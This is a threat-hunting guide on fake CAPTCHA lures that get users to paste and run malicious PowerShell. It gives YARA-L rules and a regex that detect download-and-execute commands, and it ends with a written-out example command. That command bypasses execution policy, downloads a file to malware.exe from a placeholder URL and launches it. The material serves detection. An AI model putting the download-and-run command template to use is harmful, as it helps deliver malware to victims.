# Hypothesis-Driven Threat Hunt: Fake CAPTCHA Prompting Malicious PowerShell Execution

## Step 1: Define the Hypothesis
Threat actors use fake CAPTCHA challenges to socially engineer victims into copying and executing malicious PowerShell commands, leading to initial access, malware execution, or system compromise. While credential stealers are the most commonly used, a threat actor could use this attack to execute ransomware or remote access trojans. 

## Step 2: Identify Data Sources
To detect such activities, monitor:

- **Web Traffic Logs**: Identify access to suspicious or uncommon CAPTCHA pages.
- **Clipboard Monitoring**: Detect unexpected or unauthorized content copied to the clipboard.
- **PowerShell Execution Logs**: Capture and analyze executed commands.
- **Endpoint Detection and Response (EDR) Logs**: Monitor for malicious activities post-execution.

## Step 3: Indicators of Compromise (IoCs)
- **Clipboard Events**: Sudden copying of PowerShell commands.
- **PowerShell Execution**: Commands initiating downloads or executing scripts from external sources.
- **Network Connections**: Outbound traffic to known malicious domains or IPs.
- **File System Changes**: Creation of unauthorized scripts or executables.

## Step 4: Develop Detection Queries

### (YARA-L)

**Detect Clipboard Copying of PowerShell Commands**:  
Focus on detecting subsequent PowerShell executions that could result from clipboard copying actions. YARA-L can be used to identify patterns indicative of PowerShell commands being executed after clipboard copying events.


### (YARA-L).
```
rule suspicious_powershell_execution {
    meta:
        description = "Detects PowerShell executions that may result from malicious clipboard content"
    events:
        $ps_exec.metadata.event_type = "PROCESS_LAUNCH"
        and $ps_exec.process_name = "powershell.exe"
        and $ps_exec.command_line matches /.*(Invoke-WebRequest|IEX|DownloadString).*/
    condition:
        $ps_exec
}
```
---------------------------------------------------------------------------   
### Identify PowerShell Download and Execution:

```
rule powershell_download_execute {
    meta:
        description = "Detects PowerShell commands that download and execute scripts"
    events:
        $ps_exec.metadata.event_type = "PROCESS_LAUNCH"
        and $ps_exec.process_name = "powershell.exe"
        and $ps_exec.command_line matches /.*(New-Object\s+Net.WebClient|Invoke-WebRequest).*(DownloadString|DownloadFile).*/
    condition:
        $ps_exec
}
```
---------------------------------------------------------------------------   
### Identify PowerShell Download and Execution:
Regex Pattern: Monitor PowerShell Executions with Suspicious Parameters:
```
.*(Invoke-WebRequest|IEX|DownloadString|New-Object\s+Net.WebClient|Invoke-Expression).*(http|https|file|ftp).*
``` 
### Explanation:
- PowerShell commands like Invoke-WebRequest and IEX are commonly used in malicious scripts to download and execute payloads.
- This regex checks for URLs (http, https, file, ftp) in the command line to spot suspicious downloads.

---------------------------------------------------------------------------   
### Example of Powershell command <THIS DOES NOTHING>:

```powershell
powershell -ExecutionPolicy Bypass -Noprofile -Command "invoke-Webrequest -URL 'http here' -Outfile 'C:\Users\Public\malware.exe'; Start-Process 'C\Users\Public\malware.exe'

```

### Full Command Breakdown:
- ```ExecutionPolicy Bypass:``` Temporarily bypasses the PowerShell script execution policy to allow the script to run without restriction.
- NoProfile: Prevents loading of the user profile, which speeds up the execution and avoids potential conflicts.
- Invoke-WebRequest: Downloads the payload (payload.exe) from the provided URL.
- Start-Process: Runs the downloaded malware.exe file.
